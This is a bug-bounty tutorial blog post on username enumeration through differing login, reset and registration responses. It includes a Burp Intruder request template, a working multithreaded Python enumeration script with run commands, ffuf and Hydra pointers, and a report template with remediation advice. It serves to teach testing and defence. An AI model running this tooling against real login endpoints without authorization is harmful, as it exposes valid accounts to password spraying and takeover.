# Username Enumeration via Response Differences

> **Severity:** HIGH  
> **OWASP:** A01 Broken Access Control / A07 Identification & Authentication Failures  
> **CWE:** CWE-204 – Observable Response Discrepancy  
> **Bug Bounty Payouts:** $200 – $3,000+ (depending on platform sensitivity)

---

## What Is It?

Imagine a bouncer at a club. Instead of just saying *"you can't come in"* for everyone, he says *"you're not on the list"* for some people and *"wrong password"* for others.

That distinction is the bug.

**Username enumeration via response** happens when a server returns visibly different HTTP responses for valid vs. invalid usernames during authentication flows. An attacker feeds a wordlist, watches for differences, and walks away knowing exactly which usernames exist on the target.

---

## Why It Matters

You might think: "So what if they know a username? They still need the password."

Here's the kill chain:

```
Know username → Targeted password spray → Account takeover
Know username → Credential stuffing → Account takeover
Know username → Social engineering → Account takeover
Know username → Forgot-password abuse → Reset chain attack
```

Every subsequent attack is now *surgical* instead of blind. You've cut attacker effort by 50%.

---

## Where It Occurs (Attack Surface)

| Endpoint | Leaky Response Example |
|---|---|
| `POST /login` | `{"error": "User not found"}` vs `{"error": "Incorrect password"}` |
| `POST /forgot-password` | `"Email not registered"` vs `"Reset link sent"` |
| `GET /register` | `"Username already taken"` vs `"Available"` |
| `GET /api/users/{id}` | `404 Not Found` vs `403 Forbidden` |
| `POST /api/auth/login` | HTTP `404` vs HTTP `401` |
| `POST /check-email` | `{exists: false}` vs `{exists: true}` |

The last two columns are pure gold — they're *explicit* enumeration endpoints that sometimes ship to prod.

---

## Attack Methodology

### Step 1 — Baseline the Response

Send two requests manually:
- One with a username you *know* exists (use your own account if allowed)
- One with a clearly fake username (`zzzyyyxxx@notreal.com`)

Document:
- Status code
- Response body text
- Response length
- Redirect URL (if any)
- Response time (note this for Article 2)

### Step 2 — Set Up Burp Suite Intruder

```http
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": "§FUZZ§", "password": "wrongpass_doesnt_matter"}
```

- Attack type: **Sniper**
- Payload: SecLists `Usernames/top-usernames-shortlist.txt` (1,900 entries) or `xato-net-10-million-usernames- disambiguated.txt`

### Step 3 — Identify the Signal

In Intruder results, sort by:

| Column | What to look for |
|---|---|
| **Status** | Entries with `401` when baseline is `404` |
| **Length** | Entries with unusual byte count |
| **"Grep - Extract"** | Configure to pull `error` field text |

One line in 1,900 that returns `401` instead of `404` = confirmed valid user.

### Step 4 — Confirm Manually

Always re-test the flagged username manually before reporting. Eliminate false positives — WAF variations, cache responses, and CDN inconsistencies can skew results.

---

## Automation Script

```python
#!/usr/bin/env python3
"""
Username Enum via Response — Automated Checker
Usage: python3 enum_response.py -u users.txt -t https://target.com/api/login
"""

import requests
import argparse
import sys
from concurrent.futures import ThreadPoolExecutor

def check_user(username, target, session):
    try:
        r = session.post(
            target,
            json={"username": username.strip(), "password": "X!wrongpass123"},
            timeout=10,
            allow_redirects=False
        )
        return {
            "user": username.strip(),
            "status": r.status_code,
            "length": len(r.text),
            "body_snippet": r.text[:80].replace("\n","")
        }
    except Exception as e:
        return {"user": username.strip(), "error": str(e)}

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--users",  required=True)
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-T", "--threads", type=int, default=10)
    args = parser.parse_args()

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    usernames = open(args.users).readlines()
    print(f"[*] Testing {len(usernames)} usernames against {args.target}")

    results = []
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = [ex.submit(check_user, u, args.target, session) for u in usernames]
        for f in futures:
            results.append(f.result())

    # Find baseline (most common status)
    from collections import Counter
    statuses = Counter(r.get("status") for r in results if "status" in r)
    baseline_status = statuses.most_common(1)[0][0]
    baseline_len    = Counter(r.get("length") for r in results if "length" in r).most_common(1)[0][0]

    print(f"\n[*] Baseline Status: {baseline_status}  |  Baseline Length: {baseline_len}")
    print("[+] Anomalies (potential valid users):\n")

    for r in results:
        if "error" in r: continue
        if r["status"] != baseline_status or abs(r["length"] - baseline_len) > 5:
            print(f"  [!] USER: {r['user']:<30} STATUS: {r['status']}  LEN: {r['length']}")
            print(f"       BODY: {r['body_snippet']}")

if __name__ == "__main__":
    main()
```

**Run:**
```bash
python3 enum_response.py \
  -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -t https://target.com/api/login \
  -T 5
```

---

## Common Response Patterns (Cheatsheet)

```
LEAKY PATTERN              | SIGNAL
---------------------------|------------------------------------------
HTTP 404 vs 401            | Different status = user existence leak
"not found" vs "incorrect" | Body text diff = user existence leak  
Redirect /err=1 vs /err=3  | Query param diff = user existence leak
{exists: true/false}       | Explicit leak — instant report
302 vs 200                 | Redirect behavior = indirect leak
hasTOTP: true in response  | Field presence = user config leak
```

---

## Severity Rating Guide

| Context | Severity |
|---|---|
| Corporate SSO / Internal employee login | **Critical** |
| Healthcare / financial platform login | **High** |
| E-commerce / SaaS login | **High** |
| Rate-limited (< 5 req/min) | **Medium** |
| Public username (already visible) | **Low / Info** |
| Requires CAPTCHA to exploit | **Low** |

---

## Bug Report Template

```
Title: Username Enumeration via Response Discrepancy at /api/login

Severity: High

Summary:
The login endpoint at /api/login returns different HTTP status codes 
and response body content for valid vs invalid usernames, allowing 
an attacker to enumerate valid user accounts without authentication.

Steps to Reproduce:
1. Send: POST /api/login  {"username":"nonexistent","password":"test"}
   Response: HTTP 404 {"error":"User not found"}

2. Send: POST /api/login  {"username":"admin","password":"test"}
   Response: HTTP 401 {"error":"Incorrect password"}

3. The status code difference (404 vs 401) reveals username validity.

Impact:
An attacker can enumerate valid usernames using a wordlist, then 
conduct targeted credential stuffing or password spray attacks,
significantly increasing the likelihood of account takeover.

Remediation:
- Return HTTP 401 with body {"error":"Invalid username or password"} 
  for ALL authentication failures regardless of username validity.
- Normalize response size across all failure cases.
- Implement rate limiting (5 req/min/IP) and account lockout.

CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N — Score: 5.3 (Medium-High)
```

---

## Tools Reference

| Tool | Use |
|---|---|
| Burp Suite Intruder (Sniper) | Primary enumeration |
| `ffuf -w users.txt -u URL -d '{"user":"FUZZ"}'` | Fast CLI fuzzing |
| Hydra | Login form enum |
| Custom script above | Async with anomaly detection |
| SecLists Usernames | `/Usernames/top-usernames-shortlist.txt` |

---

## Key Takeaway

**The server doesn't need to say "yes" — it just needs to say something different.**

Status code, body text, redirect, byte count, response time — any deviation leaks information. Hunt every auth endpoint for observable discrepancies. The simpler the signal, the faster the report.

---

*#300DaysWithAppSec | Day 18 | Username Enumeration via Response*

---

**Connect:**  
- LinkedIn: [linkedin.com/in/anand-prajapati-7a265a369](https://linkedin.com/in/anand-prajapati-7a265a369)  
- GitHub: [github.com/anand87794](https://github.com/anand87794)  
- Portfolio: [anandprajapati.lovable.app](https://anandprajapati.lovable.app)  
- X: [@anand87794](https://x.com/anand87794)  

@anand87794
